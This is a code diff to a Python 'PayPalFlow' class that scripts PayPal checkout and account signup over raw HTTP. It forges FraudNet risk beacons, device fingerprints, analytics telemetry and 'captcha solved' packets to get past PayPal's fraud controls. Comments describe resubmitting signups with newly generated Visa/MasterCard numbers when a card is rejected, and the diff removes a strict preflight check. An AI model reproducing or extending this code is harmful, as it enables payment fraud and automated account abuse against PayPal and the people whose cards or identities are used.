-            if browser_ok:
-                logger.info("Skipping protocol-generated Phase1 risk packets because Roxy browser runtime is active.")
-                self._send_modxo_frontend_captcha_solved_packets(page_url)
-                logger.info("Risk control signals sent")
-                return
-            if risk_mode == "roxy" or strict_browser_risk_enabled():
-                raise RuntimeError(
-                    "Roxy Phase1 risk runtime did not observe browser risk signals; "
-                    f"result={json.dumps(getattr(self.state, 'risk_signals_browser_result', {}) or {}, ensure_ascii=False)}"
-                )
-            logger.warning("Roxy Phase1 risk runtime produced no signal; falling back to protocol-generated packets.")
-
-        self.state.risk_signals_runtime_source = "protocol"
-
-        # Initial /pay HTML loads FraudNet scripts as page resources.  The
-        # browser then emits p3 and rDT before the no-interaction server action.
-        try:
-            self.session.get(
-                "https://c6.paypal.com/v1/r/d/b/p3",
-                params={"f": self.ba_token, "s": "IWC_NEXT_CHECKOUT"},
-                headers={
-                    "Accept": "*/*",
-                    "Origin": "https://www.paypal.com",
-                    "Referer": page_url,
-                    "X-Requested-With": "XMLHttpRequest",
-                    "Sec-Fetch-Site": "same-site",
-                    "Sec-Fetch-Mode": "cors",
-                    "Sec-Fetch-Dest": "empty",
-                },
-            )
-        except Exception as e:
-            logger.debug(f"FraudNet p3 beacon failed: {e}")
-        send_fraudnet_rdt(
-            self.session,
-            self.ba_token,
-            app_id="IWC_NEXT_CHECKOUT",
-            referer=page_url,
-        )
-
-        if self.state.fetch_device_fingerprint_action_id:
-            no_interaction_url = self._modxo_url_with_cfci(page_url, "no_interaction")
-            try:
-                self.session.post(
-                    no_interaction_url,
-                    files=[
-                        ("_1_ctxId", (None, self.state.ctx_id)),
-                        ("0", (None, '["$K1"]')),
-                    ],
-                    headers={
-                        **self._modxo_server_action_headers(
-                            referer=page_url,
-                            action_id=self.state.fetch_device_fingerprint_action_id,
-                        ),
-                        "PayPal-Client-Cfci": self._modxo_cfci("no_interaction"),
-                    },
-                )
-            except Exception as e:
-                logger.debug(f"no_interaction server action failed: {e}")
-
-        send_device_fingerprint(
-            self.session,
-            self.ba_token,
-            app_id="IWC_NEXT_CHECKOUT",
-            referer="https://www.paypal.com/",
-            wrapped=True,
-            page_url=page_url,
-            page_referer="",
-            include_p3=False,
-        )
-
-        send_analytics_ts(self.session, "main:xo:modxo:login", self.ba_token)
-        send_identity_di_log(self.session, self.ba_token, referer=page_url)
-        self._send_tealeaf_data(self.session, page_url)
-        self._send_datadog_rum_view(
-            self.session,
-            page_url,
-            self.ba_token,
-            dd_config=_DD_MODXO_CONFIG,
-        )
-        send_observability_emit(self.session, self.ba_token)
-        self._send_modxo_frontend_captcha_solved_packets(page_url)
-
-        logger.info("Risk control signals sent")
 
     def _phase2_create_account(self):
         """Submit 'Create Account' action to get to the signup page."""
@@ -5656,17 +6422,20 @@ class PayPalFlow:
                     ("_1_formName", (None, "createAccount")),
                     ("0", (None, f'["$K1",{{"emailSubmitTime":{int(time.time() * 1000)}}}]')),
                 ]
-            rsc_resp = self.session.post(
-                continue_url,
-                files=continue_files,
-                headers={
-                    **self._modxo_server_action_headers(
-                    referer=pay_page_url,
-                    action_id=submit_action_id,
-                    ),
-                    "PayPal-Client-Cfci": continue_cfci,
-                },
-            )
+            def post_continue_action(action_id: str):
+                return self.session.post(
+                    continue_url,
+                    files=continue_files,
+                    headers={
+                        **self._modxo_server_action_headers(
+                            referer=pay_page_url,
+                            action_id=action_id,
+                        ),
+                        "PayPal-Client-Cfci": continue_cfci,
+                    },
+                )
+
+            rsc_resp = post_continue_action(submit_action_id)
             if looks_like_paypal_authchallenge(rsc_resp.text):
                 logger.warning("Continue_To_Payment returned authchallenge HTML; manual verification is required.")
                 if not self._validate_authchallenge_if_possible(rsc_resp.text, pay_page_url):
@@ -5677,17 +6446,22 @@ class PayPalFlow:
                         rsc_resp.text,
                     )
                 else:
-                    rsc_resp = self.session.post(
-                        continue_url,
-                        files=continue_files,
-                        headers={
-                            **self._modxo_server_action_headers(
-                            referer=pay_page_url,
-                            action_id=submit_action_id,
-                            ),
-                            "PayPal-Client-Cfci": continue_cfci,
-                        },
-                    )
+                    rsc_resp = post_continue_action(submit_action_id)
+
+            if (
+                not self._extract_onboarding_redirect(rsc_resp.text)
+                and not (rsc_resp.status_code in (301, 302, 303, 307, 308) or rsc_resp.headers.get("x-action-redirect"))
+                and self._modxo_static_action_ids_enabled()
+                and self._refresh_modxo_action_ids_from_chunks(reason="continue_to_payment_no_redirect")
+            ):
+                refreshed_submit_action_id = (
+                    self.state.submit_public_credential_action_id
+                    or self.state.create_user_action_id
+                    or submit_action_id
+                )
+                if refreshed_submit_action_id != submit_action_id:
+                    submit_action_id = refreshed_submit_action_id
+                    rsc_resp = post_continue_action(submit_action_id)
             onboarding_url = self._extract_onboarding_redirect(rsc_resp.text)
             if onboarding_url:
                 logger.info(f"Onboarding redirect URL: {onboarding_url[:140]}...")
@@ -6028,6 +6802,7 @@ class PayPalFlow:
             "signup_form_fill",
             signup_url,
             dd_config=_DD_WEASLEY_CONFIG,
+            api="xhr",
         )
 
         # The compliance contentIdentifier is deployment/content-hash specific.
@@ -6047,8 +6822,6 @@ class PayPalFlow:
                 self.state.content_identifier or self._short_content_identifier(),
             )
 
-        self._strict_signup_preflight_or_raise()
-
         # Step 3: Sign up new member with all user data. If PayPal rejects the
         # card at addCard/validate.fi/cardNumber, fetch a new generated
         # Visa/MasterCard and submit SignUpNewMember again.
@@ -6067,6 +6840,7 @@ class PayPalFlow:
             "signup_complete",
             signup_url,
             dd_config=_DD_WEASLEY_CONFIG,
+            api="xhr",
         )
 
         # Send analytics for signup completion
@@ -6297,8 +7071,19 @@ class PayPalFlow:
 
         # Send Tealeaf for the review page
         self._send_tealeaf_data(self.session, review_url)
-        self._send_datadog_rum_view(self.session, review_url, self.ba_token)
-        self._send_datadog_rum_action(self.session, "review_page_loaded", review_url)
+        self._send_datadog_rum_view(
+            self.session,
+            review_url,
+            self.ba_token,
+            dd_config=_DD_HAGRID_CONFIG,
+        )
+        self._send_datadog_rum_action(
+            self.session,
+            "review_page_loaded",
+            review_url,
+            dd_config=_DD_HAGRID_CONFIG,
+            api="xhr",
+        )
         # The critical authorize mutation
         billing_agreement_id = self.state.ec_token or self.ba_token
         logger.info(
